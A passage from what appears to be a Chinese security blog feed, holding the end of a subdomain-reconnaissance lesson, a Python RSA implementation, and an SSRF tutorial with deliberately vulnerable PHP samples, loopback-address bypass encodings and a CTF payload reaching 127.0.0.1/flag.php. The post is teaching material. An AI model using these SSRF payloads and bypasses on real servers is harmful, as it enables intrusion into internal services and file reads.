style="color:blue;">搜索语法：site:baidu.com</p></blockquote><p>site语法设定的初衷是为了实现精准搜索。索引结果数不是一个网站在搜索引擎中的站点评级指标。搜索结果中URL后面的时间戳不必太过关注。site语法查询的检索结果只能说明网页被收录。<br>site：后面带不带www结果可能是不一样的，因为有些域名还包括二级域名，如：site：www。某某。com和site：某某。com，搜索结果就不一样，site：和站点名之间，不要带空格。</p><p><strong>搜索引擎发现子域名（拓展）</strong></p><blockquote><p>url前不能带http:// , 现在Google搜索可以带http:// Google会自动忽略，百度依然不能忽略带”http://“的搜索。</p></blockquote><blockquote><p>搜索引擎 site:<a href="http://www.sina.com.cn/">http://www.sina.com.cn</a></p></blockquote><p style="color:red;">Google结果：所有网站 www.sina. com.cn 上约有1660项符合 搜索引擎的查询结果，以下是第 1 - 10 项。Baidu结果：抱歉，没有找到与“site:ht tp://finance.sina.com.cn” 相关的网页。</p>> 搜索引擎：site:www.sina.com.cn<p>Google结果：所有网站 <a href="http://www.sina.com.cn/">www.sina.com.cn</a> 上约有1660项符合 搜索引擎的查询结果，以下是第 1 - 10 项。<br>Baidu结果：百度一下，找到相关网页约3,210篇，用时0.057秒。B、在过去url后边不能带斜杠“/”，现在Google和Baidu都可以带”/“。</p><p>比如说：https: //crt.sh/ 与 https ://censys.io/</p><p style="color:orange;">因为证书透明性只能查到有证书的网站，所以这里获取的域名一般没问题，而且数量较少。证书透明性获取的子域名数量其实远小于通过搜索引擎获取，一般是作为一些补充。</p>#### 2.4 枚举工具<h5 id="one-for-all"><a href="#one-for-all" class="headerlink" title="one for all"></a>one for all</h5><p>下载地址：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a><br>一款集百家之长，功能强大的全面快速子域收集终极神器，收集子域名快速且全面，但要注意一定要配置API，否 则收集的子域名会不够全。<br>注意：这个建议在虚拟机运行，直接用kali linux开个docker把环境加载进去就行。</p><h5 id="Layer子域名挖掘机"><a href="#Layer子域名挖掘机" class="headerlink" title="Layer子域名挖掘机"></a>Layer子域名挖掘机</h5><p>下载地址：<a href="https://github.com/euphrat1ca/LayerDomainFinder">https://github.com/euphrat1ca/LayerDomainFinder</a><br>这个地址下载到的其实是说这个攻击的源代码，如我在课下会把这个工具的正常使用版本放在群里。</p><h5 id="JSFinder"><a href="#JSFinder" class="headerlink" title="JSFinder"></a>JSFinder</h5><p>下载地址：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a> ,一款用作快速在网站的js文件中提取URL，子域名的工具。<br>Knock Subdomain Scan v5.3.0<br>下载地址：<a href="https://github.com/guelfoweb/knock">https://github.com/guelfoweb/knock</a> ,通过字典攻击快速枚举目标域上的子域</p><h5 id="one-for-all-1"><a href="#one-for-all-1" class="headerlink" title="one for all"></a>one for all</h5><p>下载地址：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a> </p><blockquote><p>OneForAll基于Python 3.6.0开发和测试，OneForAll需要高于Python 3.6.0的版本才能运行。 安装Python环境可以参考Python 3 安装指南。运行以下命令检查Python和pip3版本：<br>首先下载并编辑配置文件，添加自己的api和个性化设置，并保留原始文件结构<br>config ├ ── api.py ├ ── log.py └── setting.py<br>拉取镜像并执行，其中<del>/.config替换为你自己配置文件所在文件夹的路径<br>docker pull shmilylty/oneforall<br>docker run -it –rm -v ~/results:/OneForAll/results -v ~/.config:/OneForAll/config shmilylty/oneforall –target example.com run<br>参数直接加在指令末尾，结果会输出在本地目录</del>/results，如需保存到其他位置，可以自行修改。<br>如果你是通过pip3安装的依赖则使用以下命令运行示例：<br>python3 oneforall.py –target example.com run<br>python3 oneforall.py –targets ./example.txt run</p></blockquote><h3 id="三、实战演练"><a href="#三、实战演练" class="headerlink" title="三、实战演练"></a>三、实战演练</h3><h3 id="四、总结答疑"><a href="#四、总结答疑" class="headerlink" title="四、总结答疑"></a>四、总结答疑</h3><blockquote><p style="color:red;">本课程及所讲述的所有技术仅能在取得足够合法授权的企业安全建设中使用，在使用学习本课程的过程中，您应确保自己所有行为符合当地的法律法规。 如您在学习本课程后中存在任何非法行为，您将自行承担所有后果，本课程所有开发者和所有贡献者不承担任何法律及连带责任。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要阅读本课程。 您的阅读行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA公钥密码体系的Python实现</title>
      <link href="/2022/10/28/RSA%E7%9A%84Python%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/10/28/RSA%E7%9A%84Python%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="RSA公钥密码体系的Python实现"><a href="#RSA公钥密码体系的Python实现" class="headerlink" title="RSA公钥密码体系的Python实现"></a>RSA公钥密码体系的Python实现</h2><p>[TOC]</p><h3 id="RSA的算法描述"><a href="#RSA的算法描述" class="headerlink" title="RSA的算法描述"></a>RSA的算法描述</h3><p><strong>密钥的生成：</strong></p><ol><li>选择两个大素数 p，q，（p，q为互异素数，需要保密）</li><li>计算n = p×q， j(n) = (p－1)×(q－1)</li><li>选择整数 e 使 (j(n)，e) =1,  1&lt;e&lt; j(n) </li><li>计算d，使d = e－1mod j(n), 得到：公钥 为{e,n};私钥为{d}</li></ol><p><strong>加密(用e，n)：</strong>                       明文：M &lt; n  , 密文C = M e(mod n).</p><p><strong>解密(用d，n)：</strong>                       密文C; 明文M = Cd(mod n)</p><h3 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h3><p>实验环境为：</p><ul><li>Python3.7 版本</li><li>Pycharm 编译器</li><li>Random拓展库及gmpy2拓展库</li></ul><h3 id="难点分析："><a href="#难点分析：" class="headerlink" title="难点分析："></a>难点分析：</h3><p>RSA的具体实现存在一定难点，在秘钥生成阶段有：大数生成和素性检测，快速模幂运算等，在加解密阶段暴力明文数据的预处理与秘文数据转回明文数据等方面亦有困难。</p><h4 id="数据预处理："><a href="#数据预处理：" class="headerlink" title="数据预处理："></a>数据预处理：</h4><p>使用RSA加密数据，容易知道用户输入的数据段变化较大，一般可以认为为字符串类型。而在RSA密码体系中，加密过程与解密过程明文直接参与运算，这里要求秘文与生成的随机数保持一致，<br>在这里采用ASCII码的方式将其转化为数字列表，进而转化成字符串参与运算。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 将字符串转成ASCII</span><span class="token keyword">def</span> <span class="token function">Transfer_To_Ascii</span><span class="token punctuation">(</span>messages<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> message <span class="token keyword">in</span> messages<span class="token punctuation">:</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token comment"># 将列表转化成字符串</span><span class="token keyword">def</span> <span class="token function">Transfer_To_String</span><span class="token punctuation">(</span>string_list<span class="token punctuation">)</span><span class="token punctuation">:</span>    string <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>string_list<span class="token punctuation">)</span>    <span class="token keyword">return</span> string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="快速模幂运算："><a href="#快速模幂运算：" class="headerlink" title="快速模幂运算："></a>快速模幂运算：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 快速模幂运算</span><span class="token keyword">def</span> <span class="token function">quick_momi</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    a<span class="token operator">=</span> a <span class="token operator">%</span> c    ans<span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> b <span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> b<span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">:</span>            ans<span class="token operator">=</span><span class="token punctuation">(</span>ans<span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token operator">%</span>c        b<span class="token operator">>></span><span class="token operator">=</span><span class="token number">1</span>        a<span class="token operator">=</span><span class="token punctuation">(</span>a<span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token operator">%</span>c    <span class="token keyword">return</span> ans<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="大数存储及生成："><a href="#大数存储及生成：" class="headerlink" title="大数存储及生成："></a>大数存储及生成：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 算法的数学基础是初等数论中的欧拉定理，其安全性建立在大整数因子分解的困难性之上</span><span class="token comment"># 对模n的长度必须足够长，至少为1024比特 </span><span class="token comment"># p和q的长度应该相差不多；</span><span class="token comment"># p-1和q11都应该包含大的素因子；</span><span class="token comment"># gcd(p-1,q-1)应该很小；</span><span class="token comment"># d&lt;n1/4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Python支持BigNum大数类型，当数字长度大于32位会自动的转成BigNum类型，解决了大数存储的问题 。</p><p>在大数生成上，Python的拓展库中有随机数生成函数random，其中该有 random.getrandbits（）函数可以指定生成数字的数字比特位数。</p><h4 id="素性验证："><a href="#素性验证：" class="headerlink" title="素性验证："></a>素性验证：</h4><blockquote><p>实现素性验证的算法均为 概率性算法，即如果素性验证为真则不一定为真，若素性验证为假则一定为假。  </p></blockquote><p>根据费马小定理p是素数</p><ul><li>用某种概率性算法（如Miller-Rabin算法）对n进行一次素性检验，如果n没有通过检验，则重新生成随机数 </li><li>重复步骤1足够多次，如果n都通过了检测，则认为n为素数</li></ul><p><strong>Miller-Rabin算法</strong><br>       Miller-Rabin方法是一种随机化算法，设n为待检验的整数；k为选取a的次数。重复k次计算，每次在[1, n-1]范围内随机选取一个a，<br>若a^(n-1) mod n !=1 ，则n为合数；若随机选取的k个a都使a^(n-1)≡1 (mod n)成立，则返回n为素数或伪素数的信息。</p><p><strong>实现代码：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 费马检验，n为待检验的整数，rounds为检验的重复轮数</span><span class="token comment"># 返回值为1时代表通过检验</span><span class="token keyword">def</span> <span class="token function">fermat_test</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> rounds<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rounds<span class="token punctuation">)</span><span class="token punctuation">:</span>        b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token comment"># 生成一个[2,n-2]之间的随机整数</span>        <span class="token keyword">if</span> gcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">0</span>        r <span class="token operator">=</span> quick_momi<span class="token punctuation">(</span>b<span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">if</span> r <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">0</span>        <span class="token comment"># print(i)</span>    <span class="token keyword">return</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大数运算：</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞原理攻击与防御</title>
      <link href="/2022/10/25/SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
      <url>/2022/10/25/SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="SSRF漏洞原理攻击与防御"><a href="#SSRF漏洞原理攻击与防御" class="headerlink" title="SSRF漏洞原理攻击与防御"></a>SSRF漏洞原理攻击与防御</h2><blockquote><p style="color:red;">前言：笔者对SSRF的进一步研究学习基于网络安全爱好者的兴趣，与白帽黑客的责任，仅在专业靶场和补天平台授权站点进行测试。</p></blockquote><p>[TOC]</p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个漏洞</p><h3 id="一、SSRF漏洞原理："><a href="#一、SSRF漏洞原理：" class="headerlink" title="一、SSRF漏洞原理："></a>一、SSRF漏洞原理：</h3><blockquote><p style="color:blue;"> SSRF漏洞 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p></blockquote><center> <img src="https://img-blog.csdnimg.cn/b53de209637a4a88853e1762d639b5d3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6Zu254K55pWy5Luj56CB,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" style="zoom: 67%;" /></center> #### 1.1 SSRF危害<p>端口扫描、内网web应用指纹识别、攻击内网web应用、读取本地文件</p><h3 id="二、SSRF漏洞挖掘"><a href="#二、SSRF漏洞挖掘" class="headerlink" title="二、SSRF漏洞挖掘:"></a>二、SSRF漏洞挖掘:</h3><p>互联网上的很多web应用提供了从其他服务器获取数据的功能。使用用户指定的URL，web应用可以获取图片、文件资源。可以说如果链接可以访问任意请求，则存在ssrf漏洞</p><h4 id="2-1-SSRF可能产生的方式："><a href="#2-1-SSRF可能产生的方式：" class="headerlink" title="2.1 SSRF可能产生的方式："></a>2.1 SSRF可能产生的方式：</h4><ul><li><p> 分享：通过URL地址分享网页内容 </p></li><li><p>在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p></li><li><p>图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示。</p><blockquote><p><a href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p></blockquote><p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p></li><li><p>图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。 </p></li><li><p>从URL关键字中寻找，可以通过谷歌语法通过关键字寻找 SSRF漏洞</p><blockquote><p> share、wap、url、link、src、source、target、u、display、sourceURl、imageURL、domain</p></blockquote></li></ul><h4 id="2-2-PHP中可能产生SSRF漏洞的函数："><a href="#2-2-PHP中可能产生SSRF漏洞的函数：" class="headerlink" title="2.2 PHP中可能产生SSRF漏洞的函数："></a>2.2 PHP中可能产生SSRF漏洞的函数：</h4><p><strong>file_get_contents:</strong>     file_get_contents() 把整个文件读入一个字符串中。</p><blockquote><p style="color:red;">file_get_contents(path,include_path,context,start,max_length)</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">#下面的代码使用file_get_contents函数从用户指定的url获取图片。#然后把它用一个随即文件名保存在硬盘上，并展示给用户。<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token string single-quoted-string">'./images/'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">';img1.jpg'</span><span class="token punctuation">;</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;img src=\""</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">"\"/>"</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>sockopen():</strong>     使用socket跟服务器建立tcp连接，传输原始数据。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"># 以下代码使用fsockopen函数实现获取用户制定url的数据# 这个函数会使用socket跟服务器建立tcp连接，传输原始数据。<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">function</span> <span class="token function-definition function">GetFile</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (error number <span class="token interpolation"><span class="token variable">$errno</span></span>) \n"</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"GET <span class="token interpolation"><span class="token variable">$link</span></span> HTTP/1.1\r\n"</span><span class="token punctuation">;</span>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"Host: <span class="token interpolation"><span class="token variable">$host</span></span>\r\n"</span><span class="token punctuation">;</span>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"Connection: Close\r\n\r\n"</span><span class="token punctuation">;</span>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">;</span>             <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$contents</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>             <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$contents</span><span class="token operator">.=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3、curl_exec():</strong> curl_exec — 执行一个cURL会话</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$curlobj</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 详细注释版本见web351</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./curled/'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-4-相关协议"><a href="#2-4-相关协议" class="headerlink" title="2.4 相关协议"></a>2.4 相关协议</h4><p>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</p><p>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</p><p>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p><p>http/s协议：探测内网主机存活</p><h3 id="三、SSRF利用"><a href="#三、SSRF利用" class="headerlink" title="三、SSRF利用:"></a>三、SSRF利用:</h3><blockquote><p style="color:blue;">可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;<p style="color:blue;">攻击运行在内网或本地的应用程序（比如溢出）;<p style="color:blue;">对内网web应用进行指纹识别，通过访问默认文件实现;<p style="color:blue;">攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;<p style="color:blue;">利用file协议读取本地文件等。各个协议调用探针：http,file,dict,ftp,gopher等</blockquote><h3 id="四、SSRF漏洞防御："><a href="#四、SSRF漏洞防御：" class="headerlink" title="四、SSRF漏洞防御："></a>四、SSRF漏洞防御：</h3><p>通常有以下5个思路：</p><ol><li><p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p></li><li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p></li><li><p>限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p></li><li><p>黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p></li><li><p>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p></li></ol><h3 id="五、SSRF漏洞常见绕过方式："><a href="#五、SSRF漏洞常见绕过方式：" class="headerlink" title="五、SSRF漏洞常见绕过方式："></a>五、SSRF漏洞常见绕过方式：</h3><h4 id="5-1-采用短网址绕过-amp-采用进制转换"><a href="#5-1-采用短网址绕过-amp-采用进制转换" class="headerlink" title="5.1 采用短网址绕过 &amp; 采用进制转换"></a>5.1 采用短网址绕过 &amp; 采用进制转换</h4><blockquote><p style="color:blue;">采用短网址进行绕过和进制转化绕过都是非常经典的方式，127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p></blockquote><h5 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//初始化一个cURL会话</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设定返回信息中包含响应信息头</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//启用时会将头文件的信息作为数据流输出。 </span><span class="token comment">//参数为1表示输出信息头,为0表示不输出</span><span class="token comment">//设定curl_exec()函数将响应结果返回，而不是直接输出</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//参数为1表示$result,为0表示echo $result</span><span class="token comment">//执行一个cURL会话</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭一个curl会话</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在一个flag.php，直接访问给了提示，非本地用户无法访问， 要让我们以本地用户去访问127.0.0.1/flag.php </p><blockquote><p style="color:blue;">url=http://127.0.0.1/flag.php</p></blockquote><h5 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h5><pre class="line-numbers language-php" 